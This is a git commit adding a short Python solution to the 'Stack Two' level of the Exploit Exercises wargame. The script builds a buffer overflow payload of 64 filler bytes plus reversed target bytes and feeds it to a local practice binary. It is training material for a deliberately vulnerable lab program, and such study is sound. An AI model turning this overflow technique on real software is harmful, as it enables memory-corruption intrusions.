aed720dcc10ca052fc8270fa295f4c1dd57a2325
ChrisFischer-MTA <christopherrfischer@outlook.com>
2021-08-10 21:54:01 -0400

    Added stack-two

---
+++ Stack/StackTwo/stacktwo-chris.py
@@ -0,0 +1,25 @@
+# Christopher R. Fischer
+# 8/8/2021
+# Exploit Excercises - StackTwo Solution.
+
+import subprocess
+
+BFR_SIZE = 64
+# Our target address.
+target = [0x49, 0x6c, 0x59, 0x62]
+# We can just fill the buffer with garbage
+payload = 'A' * BFR_SIZE
+
+# We add something to change our target to nonzero.
+for i in range(len(target)):
+    payload += chr(target[len(target) - 1 - i])
+
+# Open the process, feed it our payload via stdin..
+openedProcess = subprocess.Popen(["./stackone.c.o", str(payload)], shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+output = openedProcess.communicate()[0]
+if b"successfully" in output:
+    print("WIN!")
+    print(output)
+else:
+    print("FAIL!")
+    print(output)
